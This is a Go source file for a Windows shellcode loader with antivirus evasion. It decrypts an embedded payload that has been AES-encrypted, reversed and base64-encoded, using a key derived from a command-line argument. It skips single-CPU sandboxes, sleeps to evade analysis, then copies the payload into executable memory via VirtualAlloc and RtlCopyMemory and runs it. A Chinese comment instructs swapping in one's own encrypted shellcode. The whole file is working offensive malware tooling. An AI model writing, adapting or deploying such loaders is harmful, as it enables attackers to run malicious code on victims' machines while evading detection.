package main
import (
	"os"
	"syscall"
	"unsafe"
	"time"
	"encoding/base64"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"runtime"
	"crypto/md5"
)
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)
var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	ntdll          = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
	text = "1dd70ec638216854a464b5901166ae9fa023d17caac6e312dfc09930058c2085905bacbe61f"
	//替换text为加密过的shellcode
)
func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}
func stringReverse(str string) string{
  var bytes []byte = []byte(str)
  for i := 0; i < len(str)/2; i++ {
    tmp := bytes[len(str)-i-1]
    bytes[len(str)-i-1] = bytes[i]
    bytes[i] = tmp
  }
  str = string(bytes)
  return str;
}

func unPaddingBytes(src []byte) []byte {
	l := len(src)
	n := int(src[l-1])
	return src[:l-n]
}

func Aes_Dec(ssaes string,MYKEY string,IV string) string {
	src, _ := hex.DecodeString(ssaes)
	block, err := aes.NewCipher([]byte(MYKEY))
	if err != nil {
		panic(err)
	}
	cbcDecrypter := cipher.NewCBCDecrypter(block, []byte(IV))
	dst := make([]byte, len(src))
	cbcDecrypter.CryptBlocks(dst, src)
	newBytes := unPaddingBytes(dst)
	return string(newBytes)
}

func Md5(str string) string {
    h := md5.New()
    h.Write([]byte(str))
    return hex.EncodeToString(h.Sum(nil))
}

func main() {
	if len(os.Args)<0{
    		 return   
    }
	cpuNum := runtime.NumCPU()
	if(cpuNum<2){
		return
	}
	strMd5 := Md5(os.Args[1])
	Mykey := strMd5[0:16]
	IV := strMd5[16:32]
	time.Sleep(12 * time.Second)
	sc_aes := Aes_Dec(text,Mykey,IV)
	sc_rev := stringReverse(sc_aes)
	sc_b64,_ := base64.StdEncoding.DecodeString(sc_rev)
	sc := sc_b64
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}